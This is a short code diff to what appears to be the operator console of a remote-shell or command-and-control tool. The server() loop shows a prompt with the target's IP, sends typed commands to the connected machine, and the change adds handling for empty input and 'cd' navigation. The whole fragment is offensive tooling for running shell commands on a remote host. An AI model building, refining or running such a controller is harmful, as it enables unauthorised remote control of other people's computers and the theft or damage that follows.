@@ -27,9 +27,13 @@ def recv():
 def server():
     while True:
         command = input(f"[{Fore.CYAN}{target_ip[0]}{Fore.RESET}]{Fore.LIGHTGREEN_EX}${Fore.RESET} ")
+        if command.strip() == "":
+            continue
         send(command)
         if command.lower().strip() == "quit" or command.lower().strip() == "exit":
             break
+        elif command.lower().strip()[:2] == "cd" and command[2:].strip() in ["/", "\\", "..", "."]:
+            pass
         elif command.lower().strip()[:3] == "cd ":
             pass
         elif command.lower().strip() == "cls" or command.lower().strip() == "clear":
